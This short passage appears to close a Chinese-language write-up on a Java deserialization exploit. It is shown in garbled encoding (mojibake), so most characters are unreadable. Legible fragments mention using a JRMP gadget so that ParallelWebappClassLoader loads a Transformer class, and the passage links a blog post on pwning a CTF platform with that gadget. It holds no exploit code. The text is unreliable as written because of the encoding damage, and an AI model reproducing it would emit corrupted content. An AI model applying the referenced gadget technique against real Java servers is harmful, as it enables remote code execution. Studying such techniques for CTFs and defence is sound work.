2.Á¨¨‰∫åÁßçËß£ÂÜ≥ÊñπÊ°àÔºåÊòØÂà©Áî® JRMPÔºåÂÆÉÁöÑ forname ‰ºöÊää ParallelWebappClassLoader ‰Ωú‰∏∫Á±ªÂä†ËΩΩÂô®ÂéªÂä†ËΩΩ Transformer Á±ªÔºå‰∏çÁè≠Èó®ÂºÑÊñß‰∫ÜÔºåÂèØÂèÇËÄÉ[Pwn a CTF Platform with Java JRMP Gadget](https://blog.orange.tw/posts/2018-03-pwn-ctf-platform-with-java-jrmp-gadget/)

ÁªìÊùü„ÄÇ